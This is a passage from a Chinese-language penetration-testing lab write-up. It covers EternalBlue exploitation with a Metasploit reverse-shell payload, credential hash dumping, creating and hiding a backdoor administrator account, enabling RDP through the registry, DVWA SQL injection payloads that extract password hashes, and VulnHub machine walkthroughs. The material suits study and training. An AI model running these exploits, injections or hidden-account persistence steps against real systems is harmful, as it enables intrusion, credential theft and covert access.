<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010  <span class="comment">#使用模块</span></span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.110.133              <span class="comment">#设置目标</span></span><br><span class="line">show options                            <span class="comment">#查看所需参数是否齐全</span></span><br><span class="line">exploit                                 <span class="comment">#执行攻击，和run一样</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720014955490.png" alt="image-20220720014955490"></p>
<p>检测出可以被永恒之蓝攻击,我们调用第一个模块</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 切换exploit/windows/smb/ms17_010_eternalblue模块</span></span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="comment"># 切换模块之后，下方有提示说要设置windows/x64/meterpreter/reverse_tcp的载荷</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注入入远程打印机服务进程(这一步要不要都没关系)</span></span><br><span class="line"><span class="built_in">set</span> processinject spoolsv.exe</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.110.133              <span class="comment">#设置目标</span></span><br><span class="line">show options                            <span class="comment">#查看所需参数是否齐全</span></span><br><span class="line">exploit                                 <span class="comment">#执行攻击，和run一样</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720020217575.png" alt="image-20220720020217575"></p>
<p>win已经成功注入和利用永恒之蓝，接下来我们查看目标ip和其他信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720020403916.png" alt="image-20220720020403916"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720020446575.png" alt="image-20220720020446575"></p>
<p>找到密码hash，用MD5解密</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720020537658.png" alt="image-20220720020537658"></p>
<p>管理员的密码到手^_^</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysinfo   <span class="comment">#查看系统信息</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720020857128.png" alt="image-20220720020857128"></p>
<p>也可以用shell直接操控远程cmd</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720020649396.png" alt="image-20220720020649396"></p>
<p>进入shell可以给自己创建私人用户，并且授予权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net user julintongxue$ 123456 /add    <span class="comment">#创建一个隐藏用户</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720021820959.png" alt="image-20220720021820959"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net localgroup administrators julintongxue$ /add    <span class="comment">#授予管理员权限</span></span><br><span class="line"><span class="comment"># 输入exit回到控制台，然后hashdump看一下权限</span></span><br><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">julintongxue$:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br><span class="line"><span class="comment"># 我的权限和管理员的权限一模一样</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720022302734.png" alt="image-20220720022302734"></p>
<p>回到kalilinux主机里面，使用rdesktop远程登陆靶机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rdesktop 192.168.110.133</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720022426306.png" alt="image-20220720022426306"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720022438311.png" alt="image-20220720022438311"></p>
<h4 id="注册表开启3389"><a href="#注册表开启3389" class="headerlink" title="注册表开启3389"></a>注册表开启3389</h4><p>如果rdesktop登不进去的话，你得看看你在信息收集的时候，看看靶机的3389端口是否开启！！！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">（输入命令为修改系统注册表，开启 3389 端口）</span><br><span class="line">C:\Windows\system32&gt;reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d <span class="string">&quot;0&quot;</span> /f</span><br></pre></td></tr></table></figure>

<p>呵呵，不要学我，你们可以在msf的shell里面修改win7的注册表即可。。。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220721225610024.png" alt="image-20220721225610024"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220721225822146.png" alt="image-20220721225822146"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220721225956759.png" alt="image-20220721225956759"></p>
<h4 id="隐藏不想显示的特定账户在登录界面"><a href="#隐藏不想显示的特定账户在登录界面" class="headerlink" title="隐藏不想显示的特定账户在登录界面"></a>隐藏不想显示的特定账户在登录界面</h4><p>这样在人家那边在登录的时候可以看出我们创建的隐藏账号的登录痕迹，即下图：</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/Snipaste_2022-07-21_22-03-09.png" alt="Snipaste_2022-07-21_22-03-09"></p>
<p>我们不可以留这种把柄给别人。。。那么得修改一下注册表，隐藏不想显示的特定账户在登录界面</p>
<p>按住键盘<code>win+r</code>唤出<code>运行</code>,在窗口里输入<code>regedit</code>调出注册表</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220721221751469.png" alt="image-20220721221751469"></p>
<p>在打开的注册表编辑器中 依次展开“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon”。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220721222142774.png" alt="image-20220721222142774"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220721222254325.png" alt="image-20220721222254325"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220721222347466.png" alt="image-20220721222347466"></p>
<p>鼠标右击Winlogon ,在弹出的菜单中点击 新建-项 输入SpecialAccounts 按回车，鼠标右击SpecialAccounts，再次新建项输入 UserList 。新建完以后如图。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220721222557106.png" alt="image-20220721222557106"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220721222631453.png" alt="image-20220721222631453"></p>
<p>之后鼠标右击 UserList -新建-DWORD值。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220721222738754.png" alt="image-20220721222738754"></p>
<p>输入你要隐藏的账户名称，如果还要添加其它账户，可以再次新建DWORD值即可。现在你可以重启一次电脑看看，账户是不是已经隐藏了。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220721222949327.png" alt="image-20220721222949327"></p>
<p>输入你要隐藏的账户名称，如果还要添加其它账户，可以再次新建DWORD值即可。现在你可以重启一次电脑看看，账户是不是已经隐藏了。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/Snipaste_2022-07-21_22-01-47.png" alt="Snipaste_2022-07-21_22-01-47"></p>
<p>再狗一点，我们把隐藏账号做成影子账号</p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h3><h4 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h4><h5 id="安装phpstudy"><a href="#安装phpstudy" class="headerlink" title="安装phpstudy"></a>安装phpstudy</h5><h5 id="下载DVWA源码"><a href="#下载DVWA源码" class="headerlink" title="下载DVWA源码"></a>下载DVWA源码</h5><h5 id="安装需要的依赖库"><a href="#安装需要的依赖库" class="headerlink" title="安装需要的依赖库"></a>安装需要的依赖库</h5><h5 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h5><p>1.这里把<code>DVWA</code>源码解压到<code>phpstudy</code>的<code>WWW</code>目录中，然后修改DVWA的配置文件目录config里面的<code>config.inc.php.dist</code>,将其重命名为<code>config.inc.php</code>。</p>
<p>2.编辑<code>config.inc.php</code>文件 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># phpstudy的默认用户和密码都是root，所以只需要修改这个即可。</span></span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_user&#x27;</span> ]     = <span class="string">&#x27;root&#x27;</span>;       </span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_password&#x27;</span> ] = <span class="string">&#x27;root&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>修改完成之后，重启phpstudy，然后登陆浏览器<code>localhost/DVWA目录名字</code>即可看到网站，然后点击里面的<code>Create/Reset Datebase</code>即可完成。</p>
<p>登录DVWA，默认用户是<code>admin</code>，密码是<code>password</code></p>
<p>这里有个地方需要小小滴小改一下，那就是<code>难度</code></p>
<p>登录进去之后找到<code>DVWA Security</code>里面有四个难度，从低到高分别是low、Medium、High、Impossible</p>
<h4 id="SQL注入-手工注入"><a href="#SQL注入-手工注入" class="headerlink" title="SQL注入(手工注入)"></a>SQL注入(手工注入)</h4><h5 id="low级"><a href="#low级" class="headerlink" title="low级"></a>low级</h5><p>首先，判断字符型注入还是数字型注入</p>
<p>1.一般可以通过直接输入单引号来判断是否存在注入点</p>
<p>2.也可以通过输入3和1+2判断注入为字符型注入，若为数字型注入，则3和1+2输出一样</p>
<p>那么我们先输入一个3得到</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ID: 3</span><br><span class="line">First name: Hack</span><br><span class="line">Surname: Me</span><br></pre></td></tr></table></figure>

<p>然后输入2+1得到</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ID: 2+1</span><br><span class="line">First name: Gordon</span><br><span class="line">Surname: Brown</span><br></pre></td></tr></table></figure>

<p>可以判断出这是字符型注入</p>
<p>字符型注入最关键的是如何闭合SQL语句以及注释多余的代码</p>
<blockquote>
<p>SELECT first_name, last_name FROM users WHERE user_id &#x3D; ‘$id’</p>
</blockquote>
<ul>
<li><p>‘ or 1&#x3D;1 or ‘ </p>
<p>SELECT first_name, last_name FROM users WHERE user_id &#x3D; ‘ ‘ or 1&#x3D;1 or ‘ ‘ </p>
<p>False or True or False</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ID: 1<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27; =&#x27;</span>1</span><br><span class="line">First name: admin</span><br><span class="line">Surname: admin</span><br><span class="line"></span><br><span class="line">ID: 1<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27; =&#x27;</span>1</span><br><span class="line">First name: Gordon</span><br><span class="line">Surname: Brown</span><br><span class="line"></span><br><span class="line">ID: 1<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27; =&#x27;</span>1</span><br><span class="line">First name: Hack</span><br><span class="line">Surname: Me</span><br><span class="line"></span><br><span class="line">ID: 1<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27; =&#x27;</span>1</span><br><span class="line">First name: Pablo</span><br><span class="line">Surname: Picasso</span><br><span class="line"></span><br><span class="line">ID: 1<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27; =&#x27;</span>1</span><br><span class="line">First name: Bob</span><br><span class="line">Surname: Smith</span><br></pre></td></tr></table></figure>

<ul>
<li><p>1’ or ‘1’ &#x3D;’1 </p>
<p>SELECT first_name, last_name FROM users WHERE user_id &#x3D; ‘1’ or ‘1’ &#x3D;’1’ </p>
<p>True or True</p>
</li>
<li><p>‘or 1&#x3D;1 # </p>
<p>SELECT first_name, last_name FROM users WHERE user_id &#x3D; ‘’or 1&#x3D;1 #’</p>
<p># 为注释</p>
<p>False or True</p>
</li>
<li><p>‘or 1&#x3D;1 –  SELECT first_name, last_name FROM users WHERE user_id &#x3D; ‘’or 1&#x3D;1 – ‘ </p>
<p>– （有空格）也是注释 </p>
<p>False or True</p>
</li>
</ul>
</li>
</ul>
<p>3.猜SQL查询语句的字段数</p>
<ul>
<li>1’ order by 2 #</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ID: 1<span class="string">&#x27; order by 2 #</span></span><br><span class="line"><span class="string">First name: admin</span></span><br><span class="line"><span class="string">Surname: admin</span></span><br></pre></td></tr></table></figure>

<ul>
<li>1’ order by 3 #</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Unknown column <span class="string">&#x27;3&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;order clause&#x27;</span></span><br></pre></td></tr></table></figure>

<p>可以判断数据库字段数为2</p>
<ul>
<li>1’ union select 1,2 #</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ID: 1<span class="string">&#x27; union select 1,2 #</span></span><br><span class="line"><span class="string">First name: admin</span></span><br><span class="line"><span class="string">Surname: admin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ID: 1&#x27;</span> union select 1,2 <span class="comment">#</span></span><br><span class="line">First name: 1</span><br><span class="line">Surname: 2</span><br></pre></td></tr></table></figure>

<p>4.查询当前用户名和数据库</p>
<ul>
<li>1’ union select user(),database() #</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ID: 查询当前用户名和数据库 1<span class="string">&#x27; union select user(),database() #</span></span><br><span class="line"><span class="string">First name: root@localhost</span></span><br><span class="line"><span class="string">Surname: dvwa</span></span><br></pre></td></tr></table></figure>

<p>5.获取数据库中的表</p>
<ul>
<li>1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ID: 获取数据库中的表 1<span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</span></span><br><span class="line"><span class="string">First name: 1</span></span><br><span class="line"><span class="string">Surname: guestbook,users</span></span><br></pre></td></tr></table></figure>

<p>6.获取表中的字段名</p>
<ul>
<li>1’ union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’#</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ID: 获取表中的字段名 1<span class="string">&#x27; union select 1, group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27;#</span></span><br><span class="line"><span class="string">First name: 1</span></span><br><span class="line"><span class="string">Surname: user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password</span></span><br></pre></td></tr></table></figure>

<p>7.获取字段中的数据</p>
<ul>
<li>1’ union select user,password from users#</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ID: 获取字段中的数据 1<span class="string">&#x27; union select user,password from users#</span></span><br><span class="line"><span class="string">First name: admin</span></span><br><span class="line"><span class="string">Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ID: 获取字段中的数据 1&#x27;</span> union select user,password from <span class="built_in">users</span><span class="comment">#</span></span><br><span class="line">First name: gordonb</span><br><span class="line">Surname: e99a18c428cb38d5f260853678922e03</span><br><span class="line"></span><br><span class="line">ID: 获取字段中的数据 1<span class="string">&#x27; union select user,password from users#</span></span><br><span class="line"><span class="string">First name: 1337</span></span><br><span class="line"><span class="string">Surname: 8d3533d75ae2c3966d7e0d4fcc69216b</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ID: 获取字段中的数据 1&#x27;</span> union select user,password from <span class="built_in">users</span><span class="comment">#</span></span><br><span class="line">First name: pablo</span><br><span class="line">Surname: 0d107d09f5bbe40cade3de5c71e9e9b7</span><br><span class="line"></span><br><span class="line">ID: 获取字段中的数据 1<span class="string">&#x27; union select user,password from users#</span></span><br><span class="line"><span class="string">First name: smithy</span></span><br><span class="line"><span class="string">Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span></span><br></pre></td></tr></table></figure>

<h5 id="Medium级"><a href="#Medium级" class="headerlink" title="Medium级"></a>Medium级</h5><h3 id="driftingblues7-vh"><a href="#driftingblues7-vh" class="headerlink" title="driftingblues7_vh"></a>driftingblues7_vh</h3><p>kali ip :</p>
<blockquote>
<p>192.168.228.128</p>
</blockquote>
<p>靶机 ip ：</p>
<blockquote>
<p>192.168.228.129</p>
</blockquote>
<p>开启driftingblues7_vh，我们先用kali进行一次arp的内网扫描</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arp-scan 192.168.228.0/24</span><br></pre></td></tr></table></figure>

<p>找到目标ip</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829104221720.png" alt="image-20220829104221720"></p>
<p>利用nmap对靶机进行二次扫描，找靶机开放的服务和端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -sV -T4 192.168.228.129</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829104712673.png" alt="image-20220829104712673"></p>
<p>在浏览器打开靶机的web的页面看看</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829105011222.png" alt="image-20220829105011222"></p>
<p>扫描一下靶机web的目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb https://192.168.228.129/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829105454907.png" alt="image-20220829105454907"></p>
<p>我们也可以使用这个来扫描</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u  https://192.168.228.129/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829110452593.png" alt="image-20220829110452593"></p>
<p>在<a href="https://192.168.228.129/bower.json%E9%87%8C%E9%9D%A2%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0">https://192.168.228.129/bower.json里面可以发现</a> Eyes Of Network 版本 5.3</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit EyesOfNetwork 5.3</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829110917888.png" alt="image-20220829110917888"></p>
<p>我们进入到 msfconsole </p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829111055118.png" alt="image-20220829111055118"></p>
<p>查找EyesOfNetwork的漏洞模块</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search EyesOfNetwork</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829111218183.png" alt="image-20220829111218183"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use 0</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829111304610.png" alt="image-20220829111304610"></p>
<p>然后设定靶机IP为192.168.228.129，kali端ip为192.168.228.128</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> rhosts 192.168.228.129</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.228.128</span><br></pre></td></tr></table></figure>

<p>执行run</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829111741201.png" alt="image-20220829111741201"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">getuid</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> flag.txt </span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829111837231.png" alt="image-20220829111837231"></p>
<p>额。。。大无语，就这样结束了！！！</p>
<h3 id="Prime-Series-Level-1"><a href="#Prime-Series-Level-1" class="headerlink" title="Prime_Series_Level-1"></a>Prime_Series_Level-1</h3><p><a href="https://download.vulnhub.com/prime/Prime_Series_Level-1.rar">下载地址</a></p>
<p>解压<code>Prime_Series_Level-1.rar</code>打开虚拟机，kali就绪</p>
<h4 id="扫描c类网段"><a href="#扫描c类网段" class="headerlink" title="扫描c类网段"></a>扫描c类网段</h4><p>kali和靶机都在192.168.110.0&#x2F;24这个段内，直接进行arp扫描</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">─<span class="comment"># arp-scan 192.168.110.0/24</span></span><br><span class="line">Interface: eth0, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:91:4e:61, IPv4: 192.168.110.135</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.110.1	00:50:56:c0:00:08	VMware, Inc.</span><br><span class="line">192.168.110.2	00:50:56:<span class="built_in">fc</span>:59:41	VMware, Inc.</span><br><span class="line">192.168.110.139	00:0c:29:c0:1f:7f	VMware, Inc.</span><br><span class="line">192.168.110.254	00:50:56:f3:bc:e9	VMware, Inc.</span><br><span class="line"></span><br><span class="line">7 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned <span class="keyword">in</span> 2.026 seconds (126.36 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>

<p>可以看出192.168.110.139是目标靶机的ip，为保确认我们用nmap看看它的端口号和系统是不是ubuntu</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">─<span class="comment"># nmap -sT -A 192.168.110.139</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-30 22:15 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.110.139</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:<span class="built_in">cd</span>:4d:2d:4d:72 (RSA)</span><br><span class="line">|   256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b (ECDSA)</span><br><span class="line">|_  256 4b:f6:f1:25:b6:13:26:d4:<span class="built_in">fc</span>:9e:b0:72:9f:f4:69:68 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-title: HacknPentest</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">MAC Address: 00:0C:29:C0:1F:7F (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.47 ms 192.168.110.139</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.69 seconds</span><br></pre></td></tr></table></figure>

<p>由nmap扫描的结果可以知道是ubuntu系统而且开启了22和80端口</p>
<p>浏览器输入靶机ip看看有什么网址。。。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220731102259616.png" alt="image-20220731102259616"></p>
<p>额。。。作者挺喜欢简洁风啊</p>
<h4 id="扫描网址目录地址"><a href="#扫描网址目录地址" class="headerlink" title="扫描网址目录地址"></a>扫描网址目录地址</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">─<span class="comment"># dirb http://192.168.110.139                  </span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sat Jul 30 22:24:32 2022</span><br><span class="line">URL_BASE: http://192.168.110.139/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.110.139/ ----</span><br><span class="line">+ http://192.168.110.139/dev (CODE:200|SIZE:131)                                                                                  </span><br><span class="line">+ http://192.168.110.139/index.php (CODE:200|SIZE:136)                                                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/javascript/                                                                                 </span><br><span class="line">+ http://192.168.110.139/server-status (CODE:403|SIZE:303)                                                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/                                                                                  </span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/javascript/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/javascript/jquery/                                                                          </span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/ ----</span><br><span class="line">+ http://192.168.110.139/wordpress/index.php (CODE:301|SIZE:0)                                                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-admin/                                                                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-content/                                                                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-includes/                                                                      </span><br><span class="line">+ http://192.168.110.139/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                                                  </span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/javascript/jquery/ ----</span><br><span class="line">+ http://192.168.110.139/javascript/jquery/jquery (CODE:200|SIZE:284394)                                                          </span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-admin/ ----</span><br><span class="line">+ http://192.168.110.139/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-admin/css/                                                                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-admin/images/                                                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-admin/includes/                                                                </span><br><span class="line">+ http://192.168.110.139/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-admin/js/                                                                      </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-admin/maint/                                                                   </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-admin/network/                                                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-admin/user/                                                                    </span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-content/ ----</span><br><span class="line">+ http://192.168.110.139/wordpress/wp-content/index.php (CODE:200|SIZE:0)                                                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-content/plugins/                                                               </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-content/themes/                                                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-content/uploads/                                                               </span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-admin/css/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-admin/images/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span 